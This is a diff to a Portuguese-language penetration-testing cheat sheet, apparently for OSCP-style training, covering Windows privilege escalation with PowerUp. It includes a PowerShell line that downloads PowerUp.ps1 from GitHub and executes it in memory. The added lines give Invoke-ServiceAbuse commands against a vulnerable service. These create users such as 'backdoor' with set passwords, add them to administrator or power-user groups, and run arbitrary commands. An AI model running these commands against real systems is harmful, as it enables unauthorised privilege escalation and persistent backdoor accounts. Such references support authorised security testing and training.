@@ -853,7 +853,7 @@ Seatbelt.exe -group=all
 ```
 # PRIVILEGE ESCALATION WINDOWS
 ## TOOLS
-##### POWERUP
+##### [POWERUP](https://blog.certcube.com/powerup-cheatsheet/)
 ```
 IEX(New-Object System.Net.WebClient).DownloadString("https://github.com/n0ts0cial/oscp/raw/main/PowerUp.ps1")
 ```
@@ -871,7 +871,29 @@ Get-Serviceunquoted -Verbose
 ```
 ACHAR SERVIÇOS ONDE O USUARIO ATUAL PODE ALTERAR O BINARIO OU MUDAR OS ARGUMENTOS
 ```
-Get-ModifiableServiceFiles -Verbose
+Get-ModifiableServiceFile -Verbose
+```
+POWERUP - EXEMPLOS
+```
+Get-ModifiableService -verbose
+```
+##### POWERUP - EXEMPLOS DE ATAQUES:
+ADICIONAR USUARIO JOHN COM SENHA: Password123!
+```
+Invoke-ServiceAbuse -Name VulnSVC   
+Get-Service VulnSVC | Invoke-ServiceAbuse
+```
+ADICIONAR AOS ADMINISTRADORES:
+```
+Invoke-ServiceAbuse -Name VulnSVC -UserName "TESTLAB\john"
+```
+ADICIONAR USUARIO, SENHA E ADICIONAR NO GRUPO
+```
+Invoke-ServiceAbuse -Name VulnSVC -UserName backdoor -Password password -LocalGroup "Power Users"
+```
+EXECCUTAR COMANDO:
+```
+Invoke-ServiceAbuse -Name VulnSVC -Command "net ..."
 ```
 ##### SHARPUP
 ```
